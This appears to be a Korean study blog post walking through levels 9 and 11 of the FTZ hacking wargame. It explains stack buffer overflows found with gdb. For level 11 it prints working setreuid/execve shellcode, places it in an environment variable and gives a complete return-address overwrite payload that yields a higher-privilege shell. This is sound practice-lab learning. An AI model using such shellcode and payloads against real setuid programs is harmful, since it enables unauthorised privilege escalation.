---
title: FTZ
author: 100zja
date: 2020-08-17
categories: [study]
tags: [ftz]
toc: ture
---

## **Level9**  

(1) gdb로 풀기  

![1](/images/구1.PNG) 

힌트가 있음을 확인하고 힌트를 읽는다 

![2](/images/구2.PNG)  
* char형 변수 buf, buf2가 10 크기의 배열로 각각 선언되고  
* 40만큼의 문자열을 fgets가 입력받아 buf에 저장한다  
* buf2에 저장된 문자가 go와 일치한다면 "Good skill!" 문구 출력과 3010의 level10 권한을 설정하고
* /bin/bash 쉘을 실행한다  

![3](/images/구3.PNG)  

gdb를 실행할 수 있는 권한이 있는 tmp로 이동한 뒤에 실행 파일을 생성한다

![4](/images/구4.PNG)  

gdb를 실행해서 메모리를 확인한다  
main+3에서 40바이트의 메모리가 할당된다  
main+43에서 eax에 ebp-40의 주소를 저장함 (buf)    
main+65에서 eax에 ebp-24의 주소를 저장함(buf2)  
===> buf에서 입력 시에 ebp-40을 넘겨 16바이트를 넘기면 ebp-24 공간을 넘어가 버퍼 오버플로우 발생가능  

![5](/images/구5.PNG)  
/usr/bin으로 이동해 bof 소스를 실행시켜 버퍼 오버플로우를 발생 시키고 level10의 권한을 얻어 my-pass로 확인한다  

**끝!!!!!!!!!!!!!!!!!!!!!!!!**


## **Level11**  

![1](/images/십1.PNG)  
ls -al로 hint 파일의 존재를 확인하고 힌트를 열어본다  

![2](/images/십2.PNG)  
* int 배열과 char 배열을 받아옴
* 문자형 str배열의 크기는 256 바이트  
* 3092는 level12의 id임  
* 사용자가 입력한 값을 str에 넣고
* str 출력
====> strcpy에서 취약점이 발생해 버퍼 오버 플로우가 일어난다  

![3](/images/십4.PNG)  


test를 입력하니 그대로 출력된 것으로 보아 힌트가 attackme의 소스코드인 것을 알 수 있다.  

![4](/images/십5.PNG)  
attackme를 권한이 있는 tmp로 복사한 뒤 tmp로 이동해 gdb로 실행시킨다  
gdb를 해석해 보면  
* setreuid전에 확보된 메모리 : 108 + 8 (16진수) = 110 => 272 byte  
* main + 9 : SFP, RET =>8 byte  
===> 256(buffer) + 8(dummy) + 4(SFP) + 4(RET)  
![5](/images/십7.PNG)  
* export 명령어를 통해서 환경변수를 등록해준다  
    - export [환경변수명]=$(python -c 'print "쉘코드"')
* 쉘코드 : "\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"  
![6](/images/십8.PNG)  
* env 명령어를 사용해 환경 변수를 확인한다  
    - env 명령어 : 현재 지정되어 있는 환경 변수들을 출력하거나, 새로운 환경 변수를 설정하고 적용된 내용을 출력하는 명령어  
    - env [옵션]... [name = 값]... [명령[인수]...]  

![7](/images/십9.PNG)  
![8](/images/십10.PNG) 

* getenv() 함수 : 환경변수를 읽는 역할  

* SHELLCODE를 실행시키는 프로그램을 짠 뒤 컴파일 해 준다  
dap을 실행해 보면 쉘코드 주소가 나타난다  

![9](/images/십11.PNG)  

* 마지막으로 RET 주소까지 가기 위해서는 268 byte가 필요하므로 페이로드(전송되는 데이터)를 작성해야한다 

* 0xbffffc1d를 리틀엔디안으로 변환하면 \x1d\xfc\xff\xbf  

* 페이로드를 완성하면 ./attackme `python -c 'print "A"*268+"\x1d\xfc\xff\xbf"'`  
그 뒤에 id를 확인하고 level12가 된 것을 확인하고 my-pass를 통해 비밀번호를 확인한다  

**끝!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!**

## **Level 12**
